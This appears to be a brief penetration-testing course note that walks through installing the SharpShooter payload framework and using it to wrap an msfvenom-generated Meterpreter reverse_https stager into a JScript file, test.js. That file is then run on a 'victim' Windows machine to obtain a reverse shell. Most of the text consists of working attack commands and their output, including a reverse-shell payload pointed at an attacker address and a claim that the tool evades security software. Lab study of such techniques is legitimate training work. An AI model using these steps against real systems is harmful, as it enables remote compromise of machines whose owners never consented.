# SharpShooter and JScript Shellcode Runner

SharpShooter is “a payload creation framework for the retrieval and execution of arbitrary C# source code” and automates part of the process discussed in this module.

SharpShooter is capable of evading various types of security software.

## Installation

```bash

cd /opt/

sudo git clone https://github.com/mdsecactivebreach/SharpShooter.git

cd SharpShooter/

sudo pip install -r requirements.txt

# If confronted with a message saying that pip cannot be found, install the package with :

sudo apt install python-pip 

```

## Usage 

Create a shellcode runner with Jscript by leveraging DotNetToJscript.

1. First, we'll use msfvenom to gnerate our Meterpreter reverse stager and write the raw output format to a file.

```bash

kali@kali:/opt/SharpShooter$ sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.x.x LPORT=443 -f raw -o /var/www/html/shell.txt
...
Payload size: 716 bytes
Saved as: /var/www/html/shell.txt
```

2. Run SharpShooter to generate our JScript shellcode runner.

```bash

kali@kali:/opt/SharpShooter$ sudo python SharpShooter.py --payload js --dotnetver 4 --stageless --rawscfile /var/www/html/shell.txt --output test
...
[*] Written delivery payload to output/test.js

```

3. Once again we must configure a multi/handler matching the generated Meterpreter shellcode. When that is done, we need to copy the generated test.js file to our Windows 10 victim machine.

When we double-click it, we obtain a reverse shell

